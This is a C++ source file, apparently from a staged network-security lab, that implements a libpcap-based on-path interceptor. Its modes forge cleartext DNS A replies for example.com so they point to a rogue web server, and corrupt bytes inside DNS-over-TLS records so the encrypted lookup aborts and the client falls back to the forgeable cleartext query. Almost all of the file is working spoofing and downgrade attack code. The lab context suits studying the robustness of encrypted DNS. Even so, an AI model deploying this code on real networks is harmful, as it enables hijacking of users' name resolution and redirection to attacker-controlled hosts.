// interceptor.cpp — Phase 7 last-mile interceptor (encrypted transport)
//
// Same pure-libpcap design as Phases 2–6 (pcap_loop capture, pcap_inject
// send; no NFQUEUE, no raw sockets). The attacker is on the client subnet
// (172.16.1.100) and the edge-router diverts client-bound replies to it.
//
// Phase 7 adds encryption on the last mile (DoT 853 / DoH 443), so this
// program handles two cases on the diverted return path:
//
//   mode=forge   — forge the cleartext example.com A reply (UDP :53). This is
//                  the Phase 6 attack, used here to forge the CLEARTEXT
//                  FALLBACK that a downgrade-tolerant client makes after its
//                  encrypted transport is denied (attacks ii/iii).
//
//   mode=tamper  — additionally corrupt the ENCRYPTED stream (TCP :853)
//                  response: flip a byte inside a TLS application_data record.
//                  TLS's record MAC then fails at the client and the DoT
//                  connection aborts — demonstrating that an on-path attacker
//                  cannot silently alter an authenticated, encrypted answer
//                  (attack i). forge (:53) stays on so the fallback is caught.
//
//   mode=normal  — relay everything untouched (used for the 7.2 verify step
//                  when the attacker is merely in the path).
//
// Everything not matched is relayed byte-for-byte toward the real client, so
// unrelated traffic and non-target names keep working.

#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <iostream>
#include <sstream>
#include <string>
#include <vector>

static const char* IFACE_DEFAULT  = "eth0";
static const char* REPLACEMENT_IP = "172.16.1.30";   // rogue-web
static const int   ETH_HDR_LEN    = 14;

// ---------------------------------------------------------------------
// checksums / integer helpers
// ---------------------------------------------------------------------
static uint16_t checksum(const unsigned char* data, size_t len) {
    uint32_t sum = 0;
    while (len >= 2) { sum += (static_cast<uint16_t>(data[0]) << 8) | data[1]; data += 2; len -= 2; }
    if (len) sum += static_cast<uint16_t>(data[0]) << 8;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return static_cast<uint16_t>(~sum);
}
static uint16_t read_u16(const unsigned char* p) { return (static_cast<uint16_t>(p[0]) << 8) | p[1]; }
static void write_u16(unsigned char* p, uint16_t v) { p[0] = v >> 8; p[1] = v & 0xff; }

// ---------------------------------------------------------------------
// DNS parse / rewrite (cleartext :53) — identical to earlier phases.
// ---------------------------------------------------------------------
static bool skip_dns_name(const unsigned char* dns, size_t len, size_t& pos) {
    while (pos < len) {
        unsigned char n = dns[pos];
        if (n == 0) { ++pos; return true; }
        if ((n & 0xc0) == 0xc0) { if (pos + 1 >= len) return false; pos += 2; return true; }
        if (n & 0xc0) return false;
        ++pos;
        if (pos + n > len) return false;
        pos += n;
    }
    return false;
}
static bool is_target_response(const unsigned char* dns, size_t len) {
    if (!dns || len < 12) return false;
    uint16_t flags = read_u16(dns + 2), qd = read_u16(dns + 4), an = read_u16(dns + 6);
    if (!(flags & 0x8000) || qd != 1 || an == 0) return false;
    size_t pos = 12; std::string name;
    while (pos < len) {
        unsigned char l = dns[pos++];
        if (l == 0) break;
        if ((l & 0xc0) != 0 || pos + l > len) return false;
        if (!name.empty()) name += '.';
        for (size_t i = 0; i < l; ++i) { char c = (char)dns[pos+i]; if (c>='A'&&c<='Z') c+=32; name+=c; }
        pos += l;
    }
    if (pos + 4 > len) return false;
    if (name != "example.com" || read_u16(dns+pos) != 1 || read_u16(dns+pos+2) != 1) return false;
    pos += 4;
    for (uint16_t i = 0; i < an; ++i) {
        if (!skip_dns_name(dns, len, pos) || pos + 10 > len) return false;
        uint16_t type = read_u16(dns+pos), kl = read_u16(dns+pos+2), rd = read_u16(dns+pos+8);
        pos += 10;
        if (pos + rd > len) return false;
        if (type == 1 && kl == 1 && rd == 4) return true;
        pos += rd;
    }
    return false;
}
static bool rewrite_dns_answer(unsigned char* dns, size_t len) {
    if (!is_target_response(dns, len)) return false;
    size_t pos = 12;
    if (!skip_dns_name(dns, len, pos) || pos + 4 > len) return false;
    pos += 4;
    unsigned char rep[4];
    if (inet_pton(AF_INET, REPLACEMENT_IP, rep) != 1) return false;
    uint16_t an = read_u16(dns + 6);
    for (uint16_t i = 0; i < an; ++i) {
        if (!skip_dns_name(dns, len, pos) || pos + 10 > len) return false;
        uint16_t type = read_u16(dns+pos), kl = read_u16(dns+pos+2), rd = read_u16(dns+pos+8);
        pos += 10;
        if (pos + rd > len) return false;
        if (type == 1 && kl == 1 && rd == 4) { std::memcpy(dns + pos, rep, 4); return true; }
        pos += rd;
    }
    return false;
}

static void recalc_udp(unsigned char* ip_pkt, size_t ip_len, size_t udp_len) {
    ip_pkt[10] = ip_pkt[11] = 0;
    write_u16(ip_pkt + 10, checksum(ip_pkt, ip_len));
    unsigned char* udp = ip_pkt + ip_len;
    udp[6] = udp[7] = 0;
    std::vector<unsigned char> ph(12 + udp_len, 0);
    std::memcpy(ph.data(), ip_pkt + 12, 8);
    ph[9] = IPPROTO_UDP;
    write_u16(ph.data() + 10, (uint16_t)udp_len);
    std::memcpy(ph.data() + 12, udp, udp_len);
    uint16_t s = checksum(ph.data(), ph.size());
    if (s == 0) s = 0xffff;
    write_u16(udp + 6, s);
}
static void recalc_tcp(unsigned char* ip_pkt, size_t ip_len, size_t tcp_len) {
    ip_pkt[10] = ip_pkt[11] = 0;
    write_u16(ip_pkt + 10, checksum(ip_pkt, ip_len));
    unsigned char* tcp = ip_pkt + ip_len;
    tcp[16] = tcp[17] = 0;
    std::vector<unsigned char> ph(12 + tcp_len, 0);
    std::memcpy(ph.data(), ip_pkt + 12, 8);
    ph[9] = IPPROTO_TCP;
    write_u16(ph.data() + 10, (uint16_t)tcp_len);
    std::memcpy(ph.data() + 12, tcp, tcp_len);
    write_u16(tcp + 16, checksum(ph.data(), ph.size()));
}

// ---------------------------------------------------------------------
// L2 plumbing
// ---------------------------------------------------------------------
static bool get_own_mac(const std::string& iface, unsigned char mac[6]) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return false;
    struct ifreq ifr{};
    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);
    bool ok = ioctl(fd, SIOCGIFHWADDR, &ifr) == 0;
    if (ok) std::memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return ok;
}
static bool arp_resolve(pcap_t* h, const unsigned char own[6], const char* own_ip,
                        const char* tip, unsigned char out[6]) {
    unsigned char f[60] = {0};
    std::memset(f, 0xff, 6); std::memcpy(f + 6, own, 6); write_u16(f + 12, ETHERTYPE_ARP);
    unsigned char* a = f + ETH_HDR_LEN;
    write_u16(a, 1); write_u16(a + 2, 0x0800); a[4] = 6; a[5] = 4; write_u16(a + 6, 1);
    std::memcpy(a + 8, own, 6); inet_pton(AF_INET, own_ip, a + 14);
    std::memset(a + 18, 0, 6); inet_pton(AF_INET, tip, a + 24);
    unsigned char want[4]; inet_pton(AF_INET, tip, want);
    for (int k = 0; k < 5; ++k) {
        if (pcap_inject(h, f, sizeof(f)) < 0) return false;
        struct pcap_pkthdr* hd; const unsigned char* p; time_t dl = time(nullptr) + 1;
        while (time(nullptr) < dl) {
            if (pcap_next_ex(h, &hd, &p) != 1) continue;
            if (hd->caplen < ETH_HDR_LEN + 28 || read_u16(p + 12) != ETHERTYPE_ARP) continue;
            const unsigned char* r = p + ETH_HDR_LEN;
            if (read_u16(r + 6) != 2) continue;
            if (std::memcmp(r + 14, want, 4) == 0) { std::memcpy(out, r + 8, 6); return true; }
        }
    }
    return false;
}

// ---------------------------------------------------------------------
// relay
// ---------------------------------------------------------------------
struct Downstream { uint32_t ip_be; unsigned char mac[6]; };
enum Mode { M_NORMAL, M_FORGE, M_TAMPER };
struct RelayState {
    unsigned char own_mac[6];
    std::vector<Downstream> clients;
    pcap_t* handle;
    Mode mode;
};
static const Downstream* find_client(const RelayState* st, uint32_t dst) {
    for (const auto& c : st->clients) if (c.ip_be == dst) return &c;
    return nullptr;
}

static void handle_packet(unsigned char* user, const struct pcap_pkthdr* hdr, const unsigned char* bytes) {
    auto* st = reinterpret_cast<RelayState*>(user);
    if (hdr->caplen < ETH_HDR_LEN + sizeof(iphdr)) return;
    if (std::memcmp(bytes + 6, st->own_mac, 6) == 0) return;      // our own injection
    if (read_u16(bytes + 12) != ETHERTYPE_IP) return;

    std::vector<unsigned char> frame(bytes, bytes + hdr->caplen);
    unsigned char* ip_pkt = frame.data() + ETH_HDR_LEN;
    auto* ip = reinterpret_cast<iphdr*>(ip_pkt);
    if (ip->version != 4) return;
    size_t ip_len = (size_t)ip->ihl * 4;
    size_t remaining = frame.size() - ETH_HDR_LEN;

    uint32_t dst_be; std::memcpy(&dst_be, ip_pkt + 16, 4);
    const Downstream* client = find_client(st, dst_be);
    if (!client) return;                                          // only relay diverted clients

    char src[INET_ADDRSTRLEN], dst[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, ip_pkt + 12, src, sizeof src);
    inet_ntop(AF_INET, ip_pkt + 16, dst, sizeof dst);
    const char* tag = "relay";

    if (ip->protocol == IPPROTO_UDP) {
        if (remaining < ip_len + sizeof(udphdr)) return;
        auto* udp = reinterpret_cast<udphdr*>(ip_pkt + ip_len);
        size_t udp_len = ntohs(udp->len);
        if (ntohs(udp->source) == 53 && udp_len >= sizeof(udphdr) + 12 &&
            ip_len + udp_len <= remaining) {
            unsigned char* dns = ip_pkt + ip_len + sizeof(udphdr);
            size_t dns_len = udp_len - sizeof(udphdr);
            if (st->mode != M_NORMAL && rewrite_dns_answer(dns, dns_len)) tag = "forge53";
            recalc_udp(ip_pkt, ip_len, udp_len);
        }
    } else if (ip->protocol == IPPROTO_TCP) {
        if (remaining < ip_len + sizeof(tcphdr)) return;
        auto* tcp = reinterpret_cast<tcphdr*>(ip_pkt + ip_len);
        size_t tcp_hlen = (size_t)tcp->doff * 4;
        size_t tcp_total = remaining - ip_len;              // TCP header + payload actually captured
        if (ntohs(tcp->source) == 853 && st->mode == M_TAMPER &&
            tcp_total > tcp_hlen + 5) {
            unsigned char* payload = ip_pkt + ip_len + tcp_hlen;
            size_t plen = tcp_total - tcp_hlen;
            // Only corrupt a TLS application_data record (content type 23),
            // leaving the handshake to complete so the break lands on the
            // actual answer rather than the connection setup.
            if (payload[0] == 0x17 && plen > 10) {
                payload[plen / 2] ^= 0xff;                   // flip a byte inside the record
                tag = "tamper853";
            }
        }
        // Docker's veth checksum offload can leave captured TCP checksums
        // partial or stale. Recalculate every relayed segment, not only a
        // segment whose TLS payload was modified, or the TCP handshake drops.
        recalc_tcp(ip_pkt, ip_len, tcp_total);
    } else {
        return;
    }

    std::memcpy(frame.data() + 0, client->mac, 6);
    std::memcpy(frame.data() + 6, st->own_mac, 6);
    pcap_inject(st->handle, frame.data(), frame.size());

    if (std::strcmp(tag, "forge53") == 0)
        std::cout << "[forge53] example.com A " << src << " -> " << dst
                  << " changed to " << REPLACEMENT_IP << std::endl;
    else if (std::strcmp(tag, "tamper853") == 0)
        std::cout << "[tamper853] corrupted TLS record " << src << " -> " << dst
                  << " (DoT will abort)" << std::endl;
    // relay lines are silent to keep the log readable
}

static std::vector<std::string> split_csv(const std::string& s) {
    std::vector<std::string> out; std::stringstream ss(s); std::string it;
    while (std::getline(ss, it, ',')) {
        size_t a = it.find_first_not_of(" \t"), b = it.find_last_not_of(" \t");
        if (a != std::string::npos) out.push_back(it.substr(a, b - a + 1));
    }
    return out;
}

int main(int argc, char** argv) {
    std::string m = (argc > 1) ? argv[1] : "normal";
    Mode mode = (m == "tamper") ? M_TAMPER : (m == "forge") ? M_FORGE : M_NORMAL;

    const char* ifc = std::getenv("IFACE");
    std::string iface = ifc ? ifc : IFACE_DEFAULT;
    const char* oip = std::getenv("ATTACKER_IP");
    std::string own_ip = oip ? oip : "172.16.1.100";
    const char* cips = std::getenv("CLIENT_IPS");
    std::string clients = cips ? cips : "172.16.1.10,172.16.1.11";

    char eb[PCAP_ERRBUF_SIZE];
    pcap_t* h = pcap_open_live(iface.c_str(), 65536, 1, 100, eb);
    if (!h) { std::cerr << "pcap_open_live: " << eb << std::endl; return 1; }
    struct bpf_program fp;
    const char* flt = "arp or (udp and src port 53) or (tcp and src port 853)";
    if (pcap_compile(h, &fp, flt, 1, PCAP_NETMASK_UNKNOWN) < 0 || pcap_setfilter(h, &fp) < 0) {
        std::cerr << "BPF: " << pcap_geterr(h) << std::endl; return 1;
    }
    pcap_freecode(&fp);

    RelayState st{};
    if (!get_own_mac(iface, st.own_mac)) { std::cerr << "own MAC failed\n"; return 1; }
    std::cout << "[interceptor] mode=" << m << " iface=" << iface << std::endl;

    for (const auto& ip_str : split_csv(clients)) {
        Downstream d{};
        if (inet_pton(AF_INET, ip_str.c_str(), &d.ip_be) != 1) continue;
        if (!arp_resolve(h, st.own_mac, own_ip.c_str(), ip_str.c_str(), d.mac)) {
            std::cerr << "[interceptor] WARNING: ARP for " << ip_str << " failed\n"; continue;
        }
        std::printf("[interceptor] client %s at %02x:%02x:%02x:%02x:%02x:%02x\n",
                    ip_str.c_str(), d.mac[0], d.mac[1], d.mac[2], d.mac[3], d.mac[4], d.mac[5]);
        st.clients.push_back(d);
    }
    if (st.clients.empty()) { std::cerr << "no clients resolved\n"; return 1; }

    st.handle = h; st.mode = mode;
    pcap_loop(h, -1, handle_packet, reinterpret_cast<unsigned char*>(&st));
    pcap_close(h);
    return 0;
}
